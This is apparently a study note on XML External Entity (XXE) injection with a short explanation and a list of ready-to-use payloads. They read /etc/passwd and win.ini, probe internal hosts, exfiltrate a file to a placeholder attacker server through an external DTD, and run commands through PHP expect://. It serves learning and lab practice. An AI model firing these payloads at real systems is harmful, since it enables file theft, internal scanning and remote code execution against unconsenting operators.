
### **What is XXE ?**
-  XML External Entity (XXE) vulnerabilities occur when an application **processes XML input that includes a reference to an external entity.** 
- This vulnerability **can occur in any technology that parses XML**. 
- By exploiting an XXE vulnerability, an attacker can read local files on the server, interact with internal systems, or conduct denial of service attacks.
#### **How it works :**

- **Normal XML :**

```xml
<?xml version="1.0"?>
<user>
  <name>John</name>
</user>
```

- **XXE ATTACK :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<creds><user>&xxe;</user><password>pass</password></creds>
```

-  **Output for the above XXE ATTACK xml file**
	-  ![[XXE injcetion in xxe 0x01 lab.png]]
### **Other Payload that you can perform :** 

```xml

1. File Read - Linux:

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

2. File Read - Windows:

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>

3. SSRF (Internal Network Scan):

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">
]>

4. Blind XXE (Out-of-Band):

<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_SERVER/evil.dtd">
  %xxe;
]>

**evil.dtd:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_SERVER/?file=%file;'>">
%eval;
%exfil;

### **5. PHP Expect RCE (If enabled):**

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>



## **Where XXE Happens:**

- File upload (XML, SVG, DOCX, PDF)
    
- API endpoints accepting XML
    
- SOAP web services
    
- RSS/Atom feeds
    
- Any XML input


```